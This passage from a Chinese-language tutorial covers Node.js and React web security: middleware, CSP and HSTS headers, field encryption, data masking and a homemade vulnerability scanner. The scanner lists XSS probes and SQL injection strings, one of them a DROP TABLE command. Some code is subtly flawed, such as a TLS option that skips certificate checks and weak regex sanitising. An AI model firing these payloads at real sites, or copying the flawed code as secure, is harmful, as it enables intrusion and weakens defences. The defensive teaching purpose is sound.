    else if (source === 'query') req.query = value;
    else if (source === 'params') req.params = value;

    next();
  };
}

// 使用示例
app.post('/api/users',
  validate('register', 'body'),
  async (req, res) => {
    // req.body已经过验证
    const { username, email, password } = req.body;
    // 创建用户逻辑
  }
);

app.get('/api/posts/:id',
  validate('idParam', 'params'),
  async (req, res) => {
    const { id } = req.params;
    // 获取文章逻辑
  }
);
```

### 7.5 接口防护实战：完整安全中间件

```javascript
// securityMiddleware.js - 完整的安全中间件组合
const { rateLimitMiddleware } = require('./rateLimiter');
const { signatureVerificationMiddleware } = require('./apiSignature');
const { validate } = require('./parameterValidator');
const helmet = require('helmet');

class SecurityMiddleware {
  // 获取完整的安全中间件栈
  static getStack(options = {}) {
    const {
      enableRateLimit = true,
      enableSignature = false,  // 仅对需要签名的API开启
      enableValidation = true
    } = options;

    const stack = [];

    // 1. Helmet安全头
    stack.push(helmet());

    // 2. CORS配置
    stack.push(this.corsMiddleware());

    // 3. 限流
    if (enableRateLimit) {
      stack.push(rateLimitMiddleware({
        windowMs: 60000,
        maxRequests: 100
      }));
    }

    // 4. 签名验证（仅对特定路由启用）
    if (enableSignature) {
      stack.push(signatureVerificationMiddleware);
    }

    // 5. 参数校验
    if (enableValidation) {
      stack.push(this.validationMiddleware());
    }

    // 6. 错误处理
    stack.push(this.errorHandler());

    // 7. 审计日志
    stack.push(this.auditLogger());

    return stack;
  }

  static corsMiddleware() {
    return (req, res, next) => {
      const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(',') || [];

      res.set({
        'Access-Control-Allow-Origin': allowedOrigins.includes(req.origin)
          ? req.origin
          : '',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
        'Access-Control-Max-Age': '86400'
      });

      if (req.method === 'OPTIONS') {
        return res.status(204).end();
      }

      next();
    };
  }

  static validationMiddleware() {
    return (req, res, next) => {
      // 全局参数清理
      const cleanValue = (value) => {
        if (typeof value === 'string') {
          // 移除潜在的危险字符
          return value
            .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
            .replace(/javascript:/gi, '')
            .replace(/on\w+=/gi, '')
            .trim();
        }
        if (typeof value === 'object' && value !== null) {
          return Object.fromEntries(
            Object.entries(value).map(([k, v]) => [k, cleanValue(v)])
          );
        }
        return value;
      };

      req.body = cleanValue(req.body);
      req.query = cleanValue(req.query);
      req.params = cleanValue(req.params);

      next();
    };
  }

  static errorHandler() {
    return (err, req, res, next) => {
      console.error('错误:', {
        message: err.message,
        stack: err.stack,
        path: req.path,
        method: req.method,
        ip: req.ip,
        userId: req.user?.id
      });

      // 不向客户端暴露内部错误详情
      if (err.name === 'ValidationError') {
        return res.status(400).json({
          error: '数据验证失败',
          code: 'VALIDATION_ERROR'
        });
      }

      if (err.name === 'UnauthorizedError') {
        return res.status(401).json({
          error: '认证失败',
          code: 'UNAUTHORIZED'
        });
      }

      // 通用错误响应
      res.status(err.status || 500).json({
        error: process.env.NODE_ENV === 'production'
          ? '服务器内部错误'
          : err.message
      });
    };
  }

  static auditLogger() {
    return (req, res, next) => {
      const startTime = Date.now();

      res.on('finish', () => {
        const duration = Date.now() - startTime;

        // 记录审计日志
        console.log(JSON.stringify({
          type: 'audit',
          timestamp: new Date().toISOString(),
          method: req.method,
          path: req.path,
          status: res.statusCode,
          duration,
          userId: req.user?.id,
          ip: req.ip,
          userAgent: req.get('User-Agent')
        }));
      });

      next();
    };
  }
}

// 应用安全中间件
app.use(SecurityMiddleware.getStack({
  enableRateLimit: true,
  enableSignature: false,
  enableValidation: true
}));
```

---

## 八、前端安全：浏览器端防护

### 8.1 Content Security Policy（CSP）

CSP是一种重要的安全头，用于防止XSS攻击。它通过白名单机制控制页面可以加载和执行哪些资源。

**CSP指令详解：**

```
Content-Security-Policy:
  default-src 'self';                    # 默认只允许同源资源
  script-src 'self' 'nonce-{random}';    # 脚本：同源 + 带nonce的内联脚本
  style-src 'self' 'unsafe-inline';      # 样式：同源 + 内联样式
  img-src 'self' data: https:;           # 图片：同源 + data URI + https
  font-src 'self' https://fonts.gstatic.com;  # 字体：同源 + Google字体
  connect-src 'self' https://api.example.com;  # AJAX：同源 + 特定API
  frame-ancestors 'none';                # 禁止被iframe嵌入
  form-action 'self';                    # 表单只能提交到同源
  base-uri 'self';                       # 限制<base>标签
```

**CSP配置实现：**

```javascript
// csp.js - CSP配置与中间件
const crypto = require('crypto');

class CSPManager {
  constructor() {
    // 为每个请求生成唯一的nonce
    this.nonce = this.generateNonce();
  }

  generateNonce() {
    return crypto.randomBytes(16).toString('base64');
  }

  // Express中间件：设置CSP头
  middleware() {
    return (req, res, next) => {
      // 为每个请求生成新的nonce
      const nonce = this.generateNonce();

      // 将nonce存储在响应本地，使其在视图模板中可用
      res.locals.nonce = nonce;

      const csp = [
        // 基础策略：默认限制同源
        "default-src 'self'",

        // 脚本策略：同源 + 内联脚本（带nonce）
        `script-src 'self' 'nonce-${nonce}'`,

        // 样式策略：同源 + 内联样式
        "style-src 'self' 'unsafe-inline'",

        // 图片策略：同源 + data URI + CDN
        "img-src 'self' data: https://cdn.example.com",

        // 连接策略：同源 + 特定API域
        "connect-src 'self' https://api.example.com wss://ws.example.com",

        // 字体策略：同源 + Google字体
        "font-src 'self' https://fonts.gstatic.com",

        // 框架策略：禁止被iframe嵌入
        "frame-ancestors 'none'",

        // 表单策略：只能提交到同源
        "form-action 'self'",

        // 对象策略：禁止Flash等插件
        "object-src 'none'",

        // 升级不安全请求
        "upgrade-insecure-requests"
      ].join('; ');

      res.set({
        'Content-Security-Policy': csp,
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY'
      });

      next();
    };
  }
}

// React中安全使用内联脚本
function SecureComponent() {
  const nonce = useContext(CSPNonceContext);

  return (
    <div>
      {/* 使用nonce的安全内联脚本 */}
      <script
        nonce={nonce}
        dangerouslySetInnerHTML={{
          __html: `
            console.log('这是一个安全的内联脚本');
          `
        }}
      />
    </div>
  );
}

module.exports = new CSPManager();
```

### 8.2 X-Frame-Options

X-Frame-Options头用于防止点击劫持攻击（Clickjacking），它控制页面是否可以被嵌入到iframe中。

```javascript
// 防止点击劫持的中间件
const clickjackingProtection = (req, res, next) => {
  // DENY：完全禁止被iframe嵌入
  res.set('X-Frame-Options', 'DENY');

  // 或者使用SAMEORIGIN：只允许同源嵌入
  // res.set('X-Frame-Options', 'SAMEORIGIN');

  // 或者使用ALLOW-FROM（已废弃）
  // res.set('X-Frame-Options', 'ALLOW-FROM https://trusted-site.com');

  next();
};

// 轩辕框架中也可以在响应级别设置
app.use((req, res, next) => {
  // 某些页面需要特殊处理
  if (req.path.startsWith('/embed/')) {
    // 嵌入页面允许被iframe加载
    res.set('X-Frame-Options', 'SAMEORIGIN');
  } else {
    // 其他页面禁止被嵌入
    res.set('X-Frame-Options', 'DENY');
  }
  next();
});
```

### 8.3 HSTS安全传输策略

HSTS（HTTP Strict Transport Security）强制浏览器使用HTTPS连接访问网站。

```javascript
// HSTS中间件
const hstsMiddleware = (req, res, next) => {
  // max-age: 浏览器应该强制使用HTTPS的秒数
  // includeSubDomains: 是否包含子域名
  // preload: 是否加入浏览器的预加载列表
  res.set('Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  );

  next();
};

// 使用helmet统一设置
const helmet = require('helmet');

app.use(helmet.hsts({
  maxAge: 31536000,        // 1年
  includeSubDomains: true,  // 包含子域名
  preload: true            // 加入预加载列表
}));
```

### 8.4 其他安全响应头

```javascript
// comprehensiveSecurityHeaders.js - 综合安全头配置
const helmet = require('helmet');

app.use(helmet({
  // 内容安全策略
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
      frameAncestors: ["'none'"],
      formAction: ["'self'"],
      upgradeInsecureRequests: []
    }
  },

  // 防止XSS攻击
  xssFilter: true,

  // 防止MIME类型嗅探
  noSniff: true,

  // 防止点击劫持
  frameguard: {
    action: 'deny'
  },

  // HSTS
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },

  // 禁止导出敏感头
  hidePoweredBy: true,

  // 限制外部链接引用
  referrerPolicy: {
    policy: 'strict-origin-when-cross-origin'
  },

  // 禁用DNS预取
  dnsPrefetchControl: {
    allow: false
  }
}));

// 自定义额外头部
app.use((req, res, next) => {
  // Permissions Policy
  res.set('Permissions-Policy',
    'geolocation=(), microphone=(), camera=(), payment=()'
  );

  // 额外的安全提示
  res.set('X-XSS-Protection', '1; mode=block');

  next();
});
```

### 8.5 前端安全实战：React安全组件

```javascript
// SecureComponents.jsx - React安全组件库
import React, { useContext, createContext } from 'react';

// 创建CSP Nonce上下文
export const CSPNonceContext = createContext('');

// 安全脚本组件
export function SecureScript({ children, ...props }) {
  const nonce = useContext(CSPNonceContext);

  return (
    <script nonce={nonce} {...props}>
      {children}
    </script>
  );
}

// 安全样式组件（避免内联样式）
export function SecureStyle({ href, ...props }) {
  // 验证样式表来源
  const allowedDomains = ['self', 'cdn.example.com'];

  const isAllowed = allowedDomains.some(domain => {
    if (domain === 'self') {
      return href?.startsWith('/') || href?.startsWith(window.location.origin);
    }
    return href?.includes(domain);
  });

  if (!isAllowed) {
    console.error('不允许加载样式表:', href);
    return null;
  }

  return <link rel="stylesheet" href={href} {...props} />;
}

// 安全图片组件
export function SecureImage({ src, alt, ...props }) {
  const [isSafe, setIsSafe] = React.useState(false);

  React.useEffect(() => {
    // 验证图片来源
    const allowedProtocols = ['https:', 'data:'];
    const allowedDomains = ['self', 'cdn.example.com'];

    try {
      const url = new URL(src, window.location.origin);
      const isAllowedProtocol = allowedProtocols.includes(url.protocol);
      const isAllowedDomain = allowedDomains.some(d =>
        d === 'self' ? url.origin === window.location.origin : url.hostname.includes(d)
      );

      setIsSafe(isAllowedProtocol && isAllowedDomain);
    } catch {
      // data URI或相对路径
      setIsSafe(src?.startsWith('data:') || src?.startsWith('/'));
    }
  }, [src]);

  if (!isSafe) {
    return <span className="broken-image" aria-label="图片无法显示" />;
  }

  return <img src={src} alt={alt} {...props} />;
}

// 安全链接组件
export function SecureLink({ href, children, ...props }) {
  const [isSafe, setIsSafe] = React.useState(true);

  React.useEffect(() => {
    if (!href) {
      setIsSafe(false);
      return;
    }

    try {
      const url = new URL(href, window.location.origin);

      // 允许的协议
      const allowedProtocols = ['https:', 'mailto:', 'tel:'];
      if (!allowedProtocols.includes(url.protocol)) {
        setIsSafe(false);
        return;
      }

      // 防止javascript:协议
      if (url.protocol === 'javascript:') {
        setIsSafe(false);
        return;
      }
    } catch {
      // 相对路径或特殊格式
    }
  }, [href]);

  if (!isSafe) {
    return <span className="unsafe-link">{children}</span>;
  }

  return (
    <a href={href} {...props}>
      {children}
    </a>
  );
}

// XSS防护Hook
export function useXSSProtection() {
  // HTML转义
  const escapeHtml = (text) => {
    const map = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, (m) => map[m]);
  };

  // 净化用户输入
  const sanitizeInput = (input) => {
    if (typeof input !== 'string') return input;

    return input
      .replace(/[<>]/g, '')  // 移除尖括号
      .replace(/javascript:/gi, '')  // 移除javascript协议
      .replace(/on\w+=/gi, '')  // 移除事件处理器
      .trim();
  };

  // 安全地设置innerHTML
  const safeSetInnerHTML = (element, html) => {
    // 使用textContent代替innerHTML
    element.textContent = html;
  };

  return {
    escapeHtml,
    sanitizeInput,
    safeSetInnerHTML
  };
}
```

---

## 九、敏感数据：加密与保护

### 9.1 敏感数据概述

敏感数据包括但不限于：

- 用户个人信息（姓名、手机号、身份证号）
- 认证凭据（密码、密钥、Token）
- 金融信息（银行卡号、支付信息）
- 医疗记录
- 商业机密

敏感数据泄露可能导致：

- 用户隐私侵犯
- 法律责任（GDPR、个人信息保护法）
- 商业损失
- 声誉损害

### 9.2 加密存储策略

```javascript
// encryptionService.js - 敏感数据加密服务
const crypto = require('crypto');

class EncryptionService {
  constructor() {
    // AES-256-GCM配置
    this.algorithm = 'aes-256-gcm';
    this.keyLength = 32;
    this.ivLength = 16;
    this.tagLength = 16;
    this.saltLength = 32;
  }

  // 从主密钥派生加密密钥
  deriveKey(password, salt) {
    return crypto.pbkdf2Sync(
      password,
      salt,
      100000,  // 迭代次数
      this.keyLength,
      'sha256'
    );
  }

  // 加密数据
  encrypt(plaintext, masterKey) {
    // 生成随机盐和IV
    const salt = crypto.randomBytes(this.saltLength);
    const iv = crypto.randomBytes(this.ivLength);

    // 派生密钥
    const key = this.deriveKey(masterKey, salt);

    // 创建cipher
    const cipher = crypto.createCipheriv(this.algorithm, key, iv);

    // 加密
    let encrypted = cipher.update(plaintext, 'utf8', 'hex');
    encrypted += cipher.final('hex');

    // 获取认证标签
    const authTag = cipher.getAuthTag();

    // 返回：salt + iv + authTag + 密文
    return {
      salt: salt.toString('hex'),
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex'),
      ciphertext: encrypted
    };
  }

  // 解密数据
  decrypt(encryptedData, masterKey) {
    const {
      salt,
      iv,
      authTag,
      ciphertext
    } = encryptedData;

    // 转换回Buffer
    const saltBuffer = Buffer.from(salt, 'hex');
    const ivBuffer = Buffer.from(iv, 'hex');
    const authTagBuffer = Buffer.from(authTag, 'hex');

    // 派生密钥
    const key = this.deriveKey(masterKey, saltBuffer);

    // 创建decipher
    const decipher = crypto.createDecipheriv(this.algorithm, key, ivBuffer);
    decipher.setAuthTag(authTagBuffer);

    // 解密
    let decrypted = decipher.update(ciphertext, 'hex', 'utf8');
    decrypted += decipher.final('utf8');

    return decrypted;
  }

  // 加密敏感字段
  encryptField(value, masterKey) {
    if (!value) return value;

    const plaintext = typeof value === 'string' ? value : JSON.stringify(value);
    const encrypted = this.encrypt(plaintext, masterKey);

    // 返回单个字符串，方便存储
    return Buffer.from(JSON.stringify(encrypted)).toString('base64');
  }

  // 解密敏感字段
  decryptField(encryptedValue, masterKey) {
    if (!encryptedValue) return encryptedValue;

    const encryptedObj = JSON.parse(Buffer.from(encryptedValue, 'base64').toString());
    return this.decrypt(encryptedObj, masterKey);
  }
}

// 用户敏感字段加密示例
class UserDataEncryption {
  constructor() {
    this.encryptionService = new EncryptionService();
    this.masterKey = process.env.MASTER_ENCRYPTION_KEY;
  }

  // 加密用户敏感字段
  encryptUserData(user) {
    return {
      ...user,
      // 加密手机号
      phone: user.phone ? this.encryptionService.encryptField(user.phone, this.masterKey) : null,
      // 加密身份证号
      idCard: user.idCard ? this.encryptionService.encryptField(user.idCard, this.masterKey) : null,
      // 加密邮箱（可选）
      email: user.email ? this.encryptionService.encryptField(user.email, this.masterKey) : null
    };
  }

  // 解密用户敏感字段
  decryptUserData(user) {
    return {
      ...user,
      phone: user.phone ? this.encryptionService.decryptField(user.phone, this.masterKey) : null,
      idCard: user.idCard ? this.encryptionService.decryptField(user.idCard, this.masterKey) : null,
      email: user.email ? this.encryptionService.decryptField(user.email, this.masterKey) : null
    };
  }
}

module.exports = new EncryptionService();
```

### 9.3 传输加密

```javascript
// secureTransport.js - 安全传输配置
const https = require('https');
const fs = require('fs');

// HTTPS服务器配置
function createSecureServer(app) {
  const options = {
    // 服务器证书
    cert: fs.readFileSync('/path/to/certificate.crt'),
    key: fs.readFileSync('/path/to/private.key'),

    // 安全的TLS配置
    minVersion: 'TLSv1.2',  // 最低TLS 1.2
    maxVersion: 'TLSv1.3',  // 最高TLS 1.3

    // 密码套件
    ciphers: [
      'TLS_AES_256_GCM_SHA384',
      'TLS_AES_128_GCM_SHA256',
      'TLS_CHACHA20_POLY1305_SHA256',
      'ECDHE-RSA-AES128-GCM-SHA256',
      'ECDHE-RSA-AES256-GCM-SHA384'
    ].join(':'),

    // 禁用不安全的选项
    honorCipherOrder: true,  // 使用服务器配置的密码顺序
    requestCert: false,      // 不要求客户端证书
    rejectUnauthorized: false
  };

  return https.createServer(options, app);
}

// API响应加密（可选，用于额外安全层）
function encryptedResponse(data, encryptionKey) {
  const service = new EncryptionService();
  const encrypted = service.encryptField(JSON.stringify(data), encryptionKey);

  return {
    encrypted: true,
    data: encrypted,
    timestamp: Date.now()
  };
}

// WebSocket安全配置
const WebSocket = require('ws');

function createSecureWebSocket(server) {
  const wss = new WebSocket.Server({
    server,
    verifyClient: (info, done) => {
      // 验证Origin
      const allowedOrigins = ['https://yourdomain.com'];
      if (!allowedOrigins.includes(info.origin)) {
        done(false, 401, 'Unauthorized origin');
        return;
      }

      // 验证Sec-WebSocket-Protocol
      // 可添加token验证等逻辑
      done(true);
    }
  });

  return wss;
}
```

### 9.4 数据脱敏

```javascript
// dataMasking.js - 数据脱敏工具
class DataMasking {
  // 手机号脱敏：138****5678
  static maskPhone(phone) {
    if (!phone || phone.length < 11) return phone;
    return phone.replace(/(\d{3})\d{4}(\d{4})/, '$1****$2');
  }

  // 身份证脱敏：110101**********1234
  static maskIdCard(idCard) {
    if (!idCard || idCard.length < 15) return idCard;
    return idCard.replace(/(\d{6})\d{8}(\d{4})/, '$1********$2');
  }

  // 邮箱脱敏：t***@example.com
  static maskEmail(email) {
    if (!email || !email.includes('@')) return email;
    const [local, domain] = email.split('@');
    if (local.length <= 2) return `${local[0]}***@${domain}`;
    return `${local[0]}***${local[local.length - 1]}@${domain}`;
  }

  // 银行卡脱敏：****1234
  static maskBankCard(cardNumber) {
    if (!cardNumber) return cardNumber;
    const last4 = cardNumber.slice(-4);
    return `****${last4}`;
  }

  // 姓名脱敏：张*三
  static maskName(name) {
    if (!name || name.length < 2) return name;
    if (name.length === 2) return `${name[0]}*`;
    return `${name[0]}${'*'.repeat(name.length - 2)}${name[name.length - 1]}`;
  }

  // 地址脱敏：北京市***区
  static maskAddress(address) {
    if (!address) return address;
    // 保留省市区信息，隐藏详细地址
    const parts = address.split(/[县区市]/);
    if (parts.length >= 2) {
      return `${parts[0]}${'*'.repeat(3)}区`;
    }
    return `${address.slice(0, 4)}***`;
  }

  // 密码脱敏：永远返回****
  static maskPassword() {
    return '********';
  }

  // 通用脱敏函数
  static mask(value, type) {
    const maskers = {
      phone: this.maskPhone,
      idCard: this.maskIdCard,
      email: this.maskEmail,
      bankCard: this.maskBankCard,
      name: this.maskName,
      address: this.maskAddress,
      password: this.maskPassword
    };

    const masker = maskers[type];
    return masker ? masker(value) : value;
  }

  // 批量脱敏对象
  static maskObject(obj, fields) {
    const masked = { ...obj };

    for (const [field, type] of Object.entries(fields)) {
      if (masked[field]) {
        masked[field] = this.mask(masked[field], type);
      }
    }

    return masked;
  }
}

// Express中间件：脱敏敏感数据
function sensitiveDataMaskingMiddleware(req, res, next) {
  const originalJson = res.json.bind(res);

  res.json = (data) => {
    if (typeof data === 'object' && data !== null) {
      const maskedData = DataMasking.maskObject(data, {
        phone: 'phone',
        idCard: 'idCard',
        email: 'email',
        bankCard: 'bankCard',
        name: 'name',
        password: 'password'
      });
      return originalJson(maskedData);
    }

    return originalJson(data);
  };

  next();
}
```

### 9.5 敏感数据实战：完整数据安全方案

```javascript
// dataSecurityManager.js - 完整的数据安全管理系统
const encryptionService = new EncryptionService();
const maskingService = new DataMasking();
const auditLog = require('./auditLog');

class DataSecurityManager {
  constructor() {
    this.masterKey = process.env.MASTER_ENCRYPTION_KEY;
    this.auditLogger = new auditLog.AuditLogger();
  }

  // 加密存储敏感数据
  async storeSensitiveData(userId, dataType, data) {
    const encrypted = encryptionService.encryptField(
      JSON.stringify(data),
      this.masterKey
    );

    // 存储加密数据
    await db.sensitiveData.create({
      userId,
      dataType,
      encrypted,
      createdAt: new Date()
    });

    // 记录审计日志
    this.auditLogger.log(userId, 'SENSITIVE_DATA_STORED', { dataType });

    return { success: true };
  }

  // 检索并解密敏感数据
  async retrieveSensitiveData(userId, dataType) {
    const record = await db.sensitiveData.findOne({
      where: { userId, dataType }
    });

    if (!record) {
      return null;
    }

    const decrypted = encryptionService.decryptField(
      record.encrypted,
      this.masterKey
    );

    // 记录审计日志
    this.auditLogger.log(userId, 'SENSITIVE_DATA_RETRIEVED', { dataType });

    return JSON.parse(decrypted);
  }

  // API响应中脱敏敏感字段
  sanitizeApiResponse(data, options = {}) {
    const {
      fieldsToMask = ['phone', 'idCard', 'email', 'bankCard'],
      maskOptions = {}
    } = options;

    // 如果是数组，批量脱敏
    if (Array.isArray(data)) {
      return data.map(item => this.sanitizeApiResponse(item, options));
    }

    // 如果是对象，脱敏指定字段
    if (typeof data === 'object' && data !== null) {
      const sanitized = { ...data };

      for (const field of fieldsToMask) {
        if (sanitized[field] !== undefined) {
          sanitized[field] = maskingService.mask(sanitized[field], field);
        }
      }

      return sanitized;
    }

    return data;
  }

  // 数据导出时加密
  async exportUserData(userId, exportFormat) {
    const user = await db.user.findById(userId);
    const userData = await this.getAllUserData(userId);

    // 收集所有敏感字段并加密
    const sensitiveFields = ['phone', 'idCard', 'email', 'address'];
    const encryptedData = { ...userData };

    for (const field of sensitiveFields) {
      if (encryptedData[field]) {
        encryptedData[field] = encryptionService.encryptField(
          encryptedData[field],
          this.masterKey
        );
      }
    }

    // 根据格式导出
    switch (exportFormat) {
      case 'json':
        return JSON.stringify(encryptedData);
      case 'csv':
        return this.convertToCSV(encryptedData);
      default:
        throw new Error('不支持的导出格式');
    }
  }

  // 数据删除（完全删除）
  async deleteUserData(userId) {
    // 删除所有敏感数据记录
    await db.sensitiveData.destroy({
      where: { userId }
    });

    // 删除主用户数据
    await db.user.destroy({
      where: { id: userId }
    });

    // 记录审计日志
    this.auditLogger.log(userId, 'USER_DATA_DELETED', {
      timestamp: new Date().toISOString()
    });

    return { success: true, deletedAt: new Date() };
  }
}
```

---

## 十、安全工具：扫描与检测

### 10.1 漏洞扫描工具

```javascript
// vulnerabilityScanner.js - 应用漏洞扫描器
const { execSync } = require('child_process');

class VulnerabilityScanner {
  constructor() {
    this.findings = [];
  }

  // XSS漏洞检测
  async scanForXSS(url) {
    const payloads = [
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      "'><script>alert('XSS')</script>",
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>'
    ];

    for (const payload of payloads) {
      try {
        const testUrl = `${url}?search=${encodeURIComponent(payload)}`;
        const response = await fetch(testUrl);

        const html = await response.text();
        if (html.includes(payload)) {
          this.findings.push({
            type: 'XSS',
            severity: 'HIGH',
            url: testUrl,
            payload,
            description: '输入未经过滤直接输出到页面'
          });
        }
      } catch (error) {
        console.error(`XSS扫描失败: ${error.message}`);
      }
    }
  }

  // SQL注入检测
  async scanForSQLInjection(url) {
    const payloads = [
      "' OR '1'='1",
      '" OR "1"="1',
      "'; DROP TABLE users;--",
      "1' AND '1'='1",
      "1 UNION SELECT NULL--"
    ];

    for (const payload of payloads) {
      try {
        const testUrl = `${url}?id=${encodeURIComponent(payload)}`;
        const response = await fetch(testUrl);

        const text = await response.text();

        // 检测SQL错误信息
        const sqlErrors = [
          'SQL syntax',
          'MySQL',
          'PostgreSQL',
          'ORA-',
          'SQLite',
          'syntax error'
        ];

        for (const error of sqlErrors) {
          if (text.includes(error)) {
            this.findings.push({
              type: 'SQL_INJECTION',
              severity: 'CRITICAL',
              url: testUrl,
              payload,
              description: `检测到SQL错误: ${error}`
            });
          }
        }
      } catch (error) {
        console.error(`SQL注入扫描失败: ${error.message}`);
      }
    }
  }

  // CSRF检测
  async scanForCSRF(formUrl) {
    try {
      const response = await fetch(formUrl);
      const html = await response.text();

      // 检查表单是否有CSRF令牌
      const hasCsrfToken = html.includes('_csrf') ||
                          html.includes('csrf_token') ||
                          html.includes('csrf-token');

      if (!hasCsrfToken) {
        this.findings.push({
          type: 'CSRF',
          severity: 'MEDIUM',
          url: formUrl,
          description: '表单缺少CSRF令牌保护'
        });
      }

      // 检查是否有SameSite Cookie
      const cookieHeader = response.headers.get('set-cookie');
      if (cookieHeader && !cookieHeader.includes('SameSite')) {
        this.findings.push({
          type: 'CSRF',
          severity: 'LOW',
          url: formUrl,
          description: 'Cookie缺少SameSite属性'
        });
      }
    } catch (error) {
      console.error(`CSRF扫描失败: ${error.message}`);
    }
  }

  // 运行所有扫描
  async runAllScans(url) {
    console.log(`开始扫描: ${url}`);

    await Promise.all([
      this.scanForXSS(url),
      this.scanForSQLInjection(url)
    ]);

    return this.generateReport();
  }

  // 生成扫描报告
  generateReport() {
    return {
      scanDate: new Date().toISOString(),
      totalFindings: this.findings.length,
      findings: this.findings,
      summary: {
        critical: this.findings.filter(f => f.severity === 'CRITICAL').length,
        high: this.findings.filter(f => f.severity === 'HIGH').length,
        medium: this.findings.filter(f => f.severity === 'MEDIUM').length,
        low: this.findings.filter(f => f.severity === 'LOW').length
      }
    };
  }
}
```

### 10.2 依赖安全检查

```javascript
// dependencyAuditor.js - 依赖安全审计
const { execSync } = require('child_process');
const fs = require('fs');

class DependencyAuditor {
  constructor() {
    this.vulnerabilities = [];
  }

  // 使用npm audit检查依赖
  async auditDependencies() {
    try {
      console.log('正在检查依赖漏洞...');

      // 运行npm audit
      const result = execSync('npm audit --json', {
        encoding: 'utf-8',
        cwd: process.cwd()
      });

      const auditResult = JSON.parse(result);

      if (auditResult.metadata) {
        const { vulnerabilities } = auditResult.metadata;

        console.log(`发现漏洞:`);
        console.log(`  - 高危: ${vulnerabilities.high || 0}`);
        console.log(`  - 中危: ${vulnerabilities.medium || 0}`);
        console.log(`  - 低危: ${vulnerabilities.low || 0}`);
      }

      return auditResult;
    } catch (error) {
      // npm audit 可能返回非零退出码如果发现漏洞
      if (error.stdout) {
        try {
          return JSON.parse(error.stdout);
        } catch {
          console.error('解析npm audit结果失败');
        }
      }
      return null;
    }
  }

  // 检查过期依赖
  async checkOutdatedPackages() {
    try {
      const result = execSync('npm outdated --json', {
        encoding: 'utf-8',
        cwd: process.cwd()
      });

      return JSON.parse(result);
    } catch (error) {
      if (error.stdout) {
        try {
          return JSON.parse(error.stdout);
        } catch {
          return {};
        }
      }
      return {};
    }
  }

  // 生成依赖报告
  async generateDependencyReport() {
    const auditResult = await this.auditDependencies();
    const outdated = await this.checkOutdatedPackages();

    const report = {
      generatedAt: new Date().toISOString(),
      project: process.cwd(),
      audit: auditResult,
      outdated,
      recommendations: []
    };

    // 生成建议
    if (auditResult?.metadata?.vulnerabilities) {
      const { vulnerabilities } = auditResult.metadata;
      if (vulnerabilities.critical > 0 || vulnerabilities.high > 0) {
        report.recommendations.push('存在高危漏洞，请立即更新相关依赖');
      }
    }

    return report;
  }

  // 自动化更新建议
  suggestUpdates() {
    try {
      const packageLock = JSON.parse(
        fs.readFileSync('./package-lock.json', 'utf-8')
      );

      const suggestions = [];

      for (const [name, info] of Object.entries(packageLock.packages)) {
        if (!info.version) continue;

        // 检查是否有安全更新的主要版本
        // 实际应用中应该调用npm view获取最新版本信息

        suggestions.push({
          package: name.replace('node_modules/', ''),
          current: info.version,
          type: 'major' // 应该从npm获取
        });
      }

      return suggestions;
    } catch (error) {
      console.error('分析依赖更新失败:', error);
      return [];
    }
  }
}
```

### 10.3 代码审计工具

```javascript
// codeAuditor.js - 代码安全审计工具
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

class CodeAuditor {
  constructor() {
    this.issues = [];
    this.rules = this.loadSecurityRules();
  }

  loadSecurityRules() {
    return [
      {
        id: 'SEC001',
        name: '禁止使用eval',
        pattern: /\beval\s*\(/,
        severity: 'HIGH',
        description: 'eval()可能执行任意代码，存在安全风险'
      },
      {
        id: 'SEC002',
        name: '禁止使用innerHTML直接插入用户输入',
        pattern: /innerHTML\s*=.*\$\{(req|body|params|query)/,
        severity: 'HIGH',
        description: 'innerHTML可能引入XSS攻击'
      },
      {
        id: 'SEC003',
        name: '检测SQL拼接',
        pattern: /`.*\$\{.*\}.*`.*(?:SELECT|INSERT|UPDATE|DELETE)/i,
        severity: 'CRITICAL',
        description: '检测到SQL拼接，可能存在SQL注入'
      },
      {
        id: 'SEC004',
        name: '禁止明文密码',
        pattern: /password\s*[:=]\s*['"][^'"]+['"]/i,
        severity: 'HIGH',
        description: '密码不应以明文形式硬编码'
      },
      {
        id: 'SEC005',
        name: '禁止使用Math.random生成Token',
        pattern: /Math\.random\(\)/,
        severity: 'MEDIUM',
        description: 'Math.random()不适合生成安全Token'
      },
      {
        id: 'SEC006',
        name: '检测敏感信息console.log',
        pattern: /console\.(log|error|warn).*(\btoken\b|\bpassword\b|\bsecret\b|\bkey\b|\bauth\b)/i,
        severity: 'MEDIUM',
        description: '检测到可能输出敏感信息'
      },
      {
        id: 'SEC007',
        name: '禁止使用不安全的Cookie设置',
        pattern: /cookie.*HttpOnly\s*:\s*false/i,
        severity: 'MEDIUM',
        description: 'Cookie应该设置HttpOnly标志'
      },
      {
        id: 'SEC008',
        name: '检测TODO安全注释',
        pattern: /\/\/\s*TODO.*(?:security|auth|permission)/i,
        severity: 'LOW',
        description: '存在未完成的安全相关TODO'
      }
    ];
  }

  // 审计单个文件
  auditFile(filePath) {
    try {
      const content = fs.readFileSync(filePath, 'utf-8');
      const lines = content.split('\n');

      for (const rule of this.rules) {
        const regex = new RegExp(rule.pattern, 'gi');
        let match;

        while ((match = regex.exec(content)) !== null) {
          // 计算行号
          const lineNumber = content.substring(0, match.index).split('\n').length;

          this.issues.push({
            file: filePath,
            line: lineNumber,
            rule: rule.id,
            ruleName: rule.name,
            severity: rule.severity,
            description: rule.description,
            code: lines[lineNumber - 1].trim(),
            match: match[0]
          });
        }
      }
